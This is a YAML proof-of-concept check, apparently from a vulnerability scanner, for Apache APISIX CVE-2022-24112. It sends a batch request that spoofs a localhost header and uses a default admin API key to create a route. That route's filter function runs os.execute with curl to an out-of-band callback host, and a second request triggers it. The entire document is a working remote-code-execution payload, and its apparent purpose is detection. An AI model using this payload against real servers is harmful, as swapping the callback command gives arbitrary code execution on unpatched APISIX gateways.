name: yaml-poc-apache-apisix-other-CVE-2022-24112
binding: 6a3fb562-3910-48b7-b4d9-df96093bc242
detail:
    author: system_user
    links:
        - http://packetstormsecurity.com/files/166228/Apache-APISIX-Remote-Code-Execution.html
        - http://packetstormsecurity.com/files/166328/Apache-APISIX-2.12.1-Remote-Code-Execution.html
        - http://www.openwall.com/lists/oss-security/2022/02/11/3
        - https://cxsecurity.com/issue/WLB-2022030040
        - https://cxsecurity.com/issue/WLB-2022030068
        - https://lists.apache.org/thread/lcdqywz8zy94mdysk7p3gfdgn51jmt94
        - https://mp.weixin.qq.com/s/5qAfjjVuE4604fMpQoEfMg
        - https://nvd.nist.gov/vuln/detail/CVE-2022-24112
        - https://packetstormsecurity.com/files/166228/Apache-APISIX-Remote-Code-Execution.html
        - https://packetstormsecurity.com/files/166328/Apache-APISIX-2.12.1-Remote-Code-Execution.html
        - https://twitter.com/LiveOverflow/status/1484662212925050880
        - https://www.cybersecurity-help.cz/vdb/SB2022021408
        - https://www.exploit-db.com/exploits/50829
    vulnerability:
        id: d5cfb12e-f9d6-45bd-b57f-f6234fb4a02a
        level: critical
transport: http
set:
    r1: randomLowercase(25)
    reverse: newReverse()
    reverseDNS: reverse.domain
rules:
    r0:
        request:
            cache: true
            method: POST
            path: /apisix/batch-requests
            headers:
                Content-Type: application/json
            body: |
                {
                "headers":{
                    "X-Real-IP":"127.0.0.1",
                    "Content-Type":"application/json"
                },
                "timeout":1500,
                "pipeline":[
                    {
                    "method":"PUT",
                    "path":"/apisix/admin/routes/index?api_key=edd1c9f034335f136f87ad84b625c8f1",
                    "body":"{\r\n \"name\": \"test\", \"method\": [\"GET\"],\r\n \"uri\": \"/api/{{r1}}\",\r\n \"upstream\":{\"type\":\"roundrobin\",\"nodes\":{\"httpbin.org:80\":1}}\r\n,\r\n\"filter_func\": \"function(vars) os.execute('curl {{reverseDNS}}'); return true end\"}"
                    }
                ]
                }
        expression: response.status == 200 && response.body.bcontains(b"\"reason\":\"OK\"") && response.body.bcontains(b"\"status\":200") && response.headers["Content-Type"].contains("text/plain")
    r1:
        request:
            cache: true
            method: GET
            path: /api/{{r1}}
        expression: reverse.wait(5)
expression: r0() && r1()
